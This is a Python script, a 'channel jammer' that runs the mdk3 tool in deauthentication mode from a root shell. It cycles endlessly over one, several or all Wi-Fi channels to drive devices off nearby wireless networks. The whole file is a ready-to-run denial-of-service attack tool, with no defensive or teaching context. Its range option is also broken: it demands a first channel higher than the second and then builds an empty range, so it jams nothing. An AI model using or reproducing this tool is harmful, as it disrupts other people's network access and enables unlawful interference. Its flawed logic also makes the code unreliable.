import time
import subprocess
import os

# Clear screen and wait briefly
time.sleep(1)
os.system("clear")

# Print banner
print("-" * 30)
print("[ - MDK3 Channel Jammer - ]")
print("-" * 30 + "\n")

print("Checking if script was started with sudo ...")

def check_sudo():
    if os.geteuid() != 0:
        print("Script was NOT started with sudo. Please start the script with sudo.")
        exit()
    else:
        print("Script was started with sudo :D\nContinuing")

def get_valid_channel(prompt):
    while True:
        try:
            channel = int(input(prompt))
            if 1 <= channel <= 12:
                return channel
            else:
                print("Invalid channel! Please enter a channel number between 1 and 12.")
        except ValueError:
            print("Invalid input! Please enter a valid integer.")

def jam_specific_channel():
    channel = get_valid_channel("Type channel number (1-12) --> ")
    while True:
        process = subprocess.Popen(["mdk3", adapter, "d", "-c", str(channel)])
        time.sleep(10)
        process.terminate()
        time.sleep(3)

def jam_channel_range(first_channel, second_channel):
    while True:
        for channel in range(first_channel, second_channel + 1):
            process = subprocess.Popen(["mdk3", adapter, "d", "-c", str(channel)])
            time.sleep(10)
            process.terminate()
            time.sleep(3)

def jam_all_channels():
    while True:
        for channel in range(1, 13):
            process = subprocess.Popen(["mdk3", adapter, "d", "-c", str(channel)])
            time.sleep(10)
            process.terminate()
            time.sleep(3)

# Check if the script was started with sudo
check_sudo()

adapter = "wlan1mon"

print("\nLoading MDK3 CHANNEL JAMMER...\n")
time.sleep(1)

print("Please select an option\n")
print("[1] - Jam ONLY 1 specific channel")
print("[2] - Jam ALL channels (Pick CH to Pick CH)")
print("[3] - Jam ALL channels (1 to 12)\n")

# User input for selection
pick_to_jam = input("I will Pick --> ")

if pick_to_jam == "1":
    jam_specific_channel()
elif pick_to_jam == "2":
    first_channel = get_valid_channel("Type FIRST channel number (1-12) --> ")
    second_channel = get_valid_channel("Type SECOND channel number (1-12) --> ")
    if first_channel < second_channel:
        print("! WARNING !\nFirst Channel MUST BE GREATER than Second Channel!")
        print("For example:\nFirst Channel: 9\nSecond Channel: 3")
    else:
        jam_channel_range(first_channel, second_channel)
elif pick_to_jam == "3":
    jam_all_channels()
else:
    print("Selected WRONG Option:", pick_to_jam)
    exit()
